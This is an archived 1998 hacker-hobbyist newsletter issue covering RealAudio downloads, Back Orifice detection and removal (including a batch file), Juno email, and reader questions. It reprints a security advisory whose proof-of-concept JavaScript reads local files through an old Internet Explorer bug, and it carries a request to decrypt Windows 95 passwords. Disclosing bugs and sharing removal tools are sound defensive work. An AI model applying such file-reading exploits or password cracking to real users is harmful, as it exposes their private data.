@@ -1,0 +1,365 @@
+Sept. 7, 1998
+
+===================================================================== 
+===================================================================== 
+URL of the day: http://www.geek-girl.com/unix.html  the UNIX Reference Desk 
+See back issues of the Happy Hacker Digest and Guides to (mostly) 
+Harmless Hacking at http://www.Happyhacker.org. 
+GTMHH en espanol: http://underhack.islatortuga.com 
+Svenska:http://w1.340.telia.com/~u34002171/hhd/gtmhh/svenska/hhdsvensk.html 
+=====================================================================
+
+TABLE OF CONTENTS 
+**This week's posts** 
+* RE: How to download Real Audio files 
+* Your own BO scanner 
+* Back Orifice detection and removal 
+* Re: Juno gold 
+* Tutorial on Hacking Into Linux boxes 
+* IE can read local files
+
+**This week's Questions** 
+* Whats an osh shell? 
+* How to decrypt a win95 password?
+
+**Answers to previous Questions** 
+* Response to "Virii Question" in 8/31 HHD...
+
+================================================================== 
+ *** RE: How to download Real Audio files 
+================================================================== 
+From: Dmitry Markushevich <Dmitry@Home.Com>
+
+You are not necessarily right here. Any real audio files that are simply 
+hosted on a HTTP server can be downloaded like you described. 
+More serious users actually use RealAudio server with it you can access the 
+actual file without the real player, because the directory structure that is 
+described in the url does not correspond to the one that http server uses. 
+For example, a ram file I downloaded contained this string:
+
+pnm://www.russian-ad.com/russian-ad/3.rm
+
+Obviously this is not something IE would be able to access. 
+_________________________________________________ 
+From: milenko <milenko@hardlink.com>
+
+I really wish this worked - but it doesn't.  Most real audio files 
+are stored on special real audio servers using special real audioprotocol. 
+These servers can't be accessed by your browser - even if you use the 
+correct port.  You need to use your realaudio player.
+
+This sucks because the real player has all kinds of restrictions. 
+For example, if the realaudio server tells your client that a file is 
+copyrighted the client doesn't let you save it.  It would be kinda cool if 
+someone made an unrestricted "pirate" realplayer.
+
+If anyone knows how to save from a realaudio server please do tell.
+
+Dirk Nasty 
+=================================================================== 
+ *** Your own BO scanner 
+=================================================================== 
+From: moonlit@moonman.com
+
+This is for people who are paranoid about downloading Anti Back 
+Orifice programs like AntiGen (www.arez.com/fs) or Back Orifice 
+Eliminator (www.bardon.com), fearing that they're laced with BO (like 
+BoSniffer.zip, I forget the URL it can be found in) then you can 
+write a simple batch file to detect and delete Back Orifice's default 
+installation.
+
+Here's what mine looks like: 
+8< --- Cut here ---
+
+@echo off 
+rem Change \Windows to \Win95 or \Win98 if that's what you have 
+rem throughout the code.
+
+if not exist C:\Windows\System\exe~1 goto End 
+if not exist C:\Windows\System\windll.dll goto End
+
+echo WARNING! Back Orifice is in your system! 
+echo Restart in DOS and run this again to delete it. 
+echo. 
+echo 1. Exit and restart? 
+echo 2. Clean (already in DOS) 
+echo. 
+choice /C:12 /N 
+if errorlevel 2 goto Clean 
+if errorlevel 1 goto End
+
+:Clean 
+attrib -h -r -s -a C:\Windows\System\exe~1 
+attrib -h -r -s -a C:\Windows\System\windll.dll 
+del C:\Windows\System\exe~1 
+del C:\Windows\System\windll.dll 
+echo Back Orifice files have been deleted. 
+goto End
+
+:End
+
+8< --- Cut here ---
+
+Save it with a .BAT extension and put it in your StartUp folder if 
+you want it to run everytime you start Windows.
+
+You still have to edit the Registry to get rid of the (.exe) in the 
+(Default) found in:
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersio\RunServices 
+But BO won't run without windll.dll and exe~1.
+
+Oh yeah, I'm not responsible if the info here damages your computer. 
+It worked fine on my Win95 and Win98. You're taking the risk in using it. 
+Any corrections are always welcome.
+
+- Moonlit Angel 
+================================================================== 
+ *** Back Orifice detection and removal 
+================================================================== 
+(Reprinted from the Bugtraq list. To subscribe to Bugtraq, email 
+LISTSERV@NETSPACE.ORG with message "subscribe bugtraq".)
+
+From: The Late Ian Angles <ia@ST-ANDREWS.AC.UK>
+
+Hey Everybody, 
+I'm just back on the bugtraq list so apologies if anyone's already done 
+this and we don't know about it....
+
+One of my colleagues, Simon Smith, has written a Back Orifice detection 
+and removal program called B.O.R.E.D (which stands for something less 
+obscene than the working title...) and can be obtained from:
+
+http://www.st-andrews.ac.uk/~sjs/bored/bored.html
+
+with a few explanations.
+
+Any (uh, most :-) comments and criticism will be appreciated (then 
+deleted, restored from backup, printed off and recycled as firelighters)
+
+-ian- 
+================================================================== 
+ ***  Re: Juno gold 
+================================================================== 
+From: gjpearce@juno.com (Graham J Pearce)
+
+DISCLAIMER: I am in no way associated with Juno Online Services, L. P., 
+except that I heavily use their free service.
+
+Juno Gold is Juno's new file-attachments service. Yes, they are promoting 
+this because most people don't know how to UUen/decode, and don't have the 
+time to bother. But easy file attachments is NOT *all* that you get for 
+$2.95/month (well, you do have to pay $35.40 for a whole year at a time...) 
+You get the ability to SEND file attachments, which you didn't even mention, 
+but besides that:
+
+With the free Juno service, you get a 1MB mailbox, and a 2MB daily 
+send/receive quota. With Juno Gold, you get a 5MB mailbox, and 5MB 
+send/receive daily quota. (You also have a 50MB annual  limit.) :-(
+
+But more to the point, the free service can only accept mails under 64K - 
+and that includes the headers, the text of the message, and all attachments. 
+Anything bigger than that gets bounced back to the sender. Juno Gold gives 
+you 1 Meg per message, including headers, message, and attachments. 
+Juno Gold also gets rid of that tagline that says "You don't need to buy 
+internet access..." but you can get rid of it with the free Juno by cc'ing 
+the message to a Juno address (can even be your own.)
+
+There are other benefits of Juno gold that are not relevant here; for more 
+info on the differences between and limits of Juno Gold/Juno Web (Juno Web 
+gives you the same e-mail limits as Gold, plus web access, for $20/mo), send 
+a blank e-mail to limits@support.juno.com.
+
+Besides that, there are much better encoders/decoders than Winzip. Winzip is 
+not free; Wincode is an excellent freeware en/decoder. Look for more 
+freeware/shareware coders on  Simtel.Net under:
+
+Windows 9x/NT: ftp://ftp.simtel.net/pub/simtelnet/win95/decode 
+Windows 3.x: ftp://ftp.simtel.net/pub/simtelnet/win3/decode 
+DOS: ftp://ftp.simtel.net/pub/simtelnet/msdos/decode
+
+Sorry, you'll have to find your own Linux programs for now...  And by the 
+way, your attachments that show up at the bottom of your message are most 
+likely NOT uuencoded. Most file attachments these days use MIME/BASE64, 
+which has been known to get corrupted 3 out of 5 times after passing through 
+Juno.
+
+UUencoding, however, works reliably w/Juno. Personally, I don't use Gold. 
+Sure, it places some limits on you,  most of which _can_ be worked around, 
+BTW. If you would like more information about Juno, or how you can access 
+the entire Internet through free Juno, please e-mail me at gjpearce@juno.com.
+
+-- GJP 
+gjpearce@juno.com 
+================================================================== 
+ *** Tutorial on Hacking Into Linux boxes 
+================================================================== 
+From: "admin" <darkmetal@hack.co.za>
+
+Goodday
+
+I have written a Tutorial on Hacking Into Linux boxes and have got a very 
+good responce from newbies and beginners although I have got some hardcore 
+threats from "top-gun?" hackers.
+
+The reason why I am telling you this is I heard you seem to go through that 
+type of thing alot and I was wondering if you may have any tips on this type 
+of situation...
+
+The 2nd reason I am posting this to you is because I would like to give 
+newbies and learners alike the ability to start hacking... I hear too often 
+these words " I have linux, now what??"
+
+My tutorial and web site is at www.hack.co.za
+
+May this post be sent to the list "as is"?
+
+Thanking you very much for your time...
+
+Sincere Regards 
+darkmetal ( www.hack.co.za ) 
+"hack into them as they hack into us"
+
+Ps. keep up the great work.. 
+================================================================== 
+ *** IE can read local files 
+================================================================== 
+From: Georgi Guninski <guninski@USA.NET>
+
+There is a bug in Internet Explorer 3, 4.0, 4.01 (for version information 
+see Microsoft's info below), which allows a specially designed web page to 
+read text or HTML files from the user's computer and send their contents to 
+an arbitrary host, even if the user is behind firewall. The bug uses 
+Javascript and the file name and location must be known.
+
+Another way to exploit this bug is to send a specially designed message to 
+an Outlook Express/IE4 user.
+
+Demonstration of this is available at: 
+http://www.geocities.com/ResearchTriangle/1711/good-read.html
+
+Workaround: Disable Javascript. 
+Microsoft has released a patch at: 
+http://www.microsoft.com/security/bulletins/ms98-013.htm
+
+Georgi Guninski 
+http://www.geocities.com/ResearchTriangle/1711
+
+The source of the page:
+
+----Cut here--- 
+<HTML> 
+<HEAD> 
+<TITLE>Read text/HTML file with Internet Explorer 4.01></TITLE> 
+</HEAD>
+
+<BODY>This demonstrates a bug in IE 4.01 under Windows 95 (don't know for 
+other versions), which allows reading text or HTML file on the user's machine.
+
+<B>Create the file c:\test.txt</B> and its contents are shown in a message 
+box. The file may be sent to an arbitrary server even if behind a firewall.<BR>
+
+To test it, you need Javascript enabled.<BR>
+
+This file is created by <A 
+HREF=http://www.geocities.com/ResearchTriangle/1711>Georgi Guninski.</A>
+
+<SCRIPT LANGUAGE="JAVASCRIPT">
+
+alert("This page demonstrates reading the file C:\\test.txt (you may need to 
+create a short file to view it)");
+
+var x=window.open('file://C:/test.txt'); 
+x.navigate("javascript:eval(\"var 
+a=window.open('file://C:/test.txt');r=a.document.body.innerText;alert(r);\")");
+
+</SCRIPT> 
+</BODY> 
+</HTML> 
+================================================================= 
+ *** Whats an osh shell? 
+================================================================= 
+From: billsat@proaxis.com
+
+Whats an osh shell? My shell account server is doing some construction and 
+instead of a bash shell it's an osh shell, it doesn't have near as many 
+commands or even pine or elm or sendmail.
+
+I'm curios to know what exactly an osh shell is.
+
+Al 
+================================================================= 
+ *** How to decrypt a win95 password? 
+================================================================= 
+From: "Steven kok" <stephen1581@hotmail.com>
+
+Hi,
+
+I was wondering if any one knows how to decrypt a win95 password. 
+Please email me if you know how to do it, and tell me how it's done.
+
+Thanks. 
+================================================================== 
+ *** Response to "Virii Question" in 8/31 HHD... 
+================================================================== 
+From: FiReWaLL <phyrewall@geocities.com>
+
+In the August 31 edition of the HHD, Dmitry Markushevich wondered if it was 
+possible to PHYSICALLY damage your computer's hardware.  As any good gamer 
+kows, it IS possible to destroy variable clock-speed 3D accelerators such the 
+3Dfx VooDoo chipset based cards by overclocking them too high. Therefore, a 
+virus specifically targeting these devices could quite easily fry your 3Dfx 
+card.
+
+However, as far as I know (and I have occasionally been messing around 
+with these things...), it is not possible to PERMANENTLY damage a hard drive, 
+although it is likely possible to render it unsalvageable by conventional 
+format programs.  If this is the case, the drive manufacturer may have to 
+"reinitialize" the drive.
+
+Hope this helps!!
+
+=FiReWaLL= 
+phyrewall@geocities.com 
+______________________________________________ 
+From: Mach5 <machfive@ptd.net>
+
+Dmitry,
+
+There is no way any one could 'blow up' your hard drive or anything 
+like that, the one you probably heard was the Good Times Virus hoax (if you 
+wanna know about it search yahoo, its pretty funny to read) which 
+supposedly caused a whole bunch of crap.
+
+The worst virus that I know of is win98_CIH, which attemps to send some 
+garbage to overwrite flash bios, causing your computer to not work, and 
+causing you to go buy a new BIOS chip for 5 bucks, also, this virus doesn't 
+work if your BIOS is write protected, and not on all machines (it also 
+attacks the 26th of every month, too). CIH (AND BACK ORIFICE, by the way) 
+can be easily cleaned with AVP (www.avp.com).
+
+Later dood, don't worry about that s&#$ unless your a warez feind or like to 
+DL canned h4x0r proggiez.
+
+I'm audi...
+
+[Dale: Ever try to buy a new BIOS chip? Call AMI and ask them for one, see 
+what they tell ya... Sometimes the simplest thing can be a BIG pain in the butt!
+
+Also - I think it's "outie", not "audi"...] 
+__________________________________________________________________ 
+
+  
+ 
+
+This is a list devoted to *legal* hacking! If you plan to use any 
+information in this Digest or at our Web site to commit crime, go away! 
+Foo on you! Happy Hacker is a 501 (c) (3) tax deductible organization 
+in the United States operating under Shepherd's Fold Ministries. Yes! 
+This is all a plot to save your immortal souls!
+
+For Windows questions, please write Roger Prata<rprata@techbroker.com> or 
+keydet89@yahoo.com; for Macs, write Strider <Strider@clarityconnect.com>. 
+Happy Hacker Digest editor: Dale Holmes <editor@techbroker.com>
+
+Happy Hacker Grand Pooh-bah: Carolyn Meinel <>
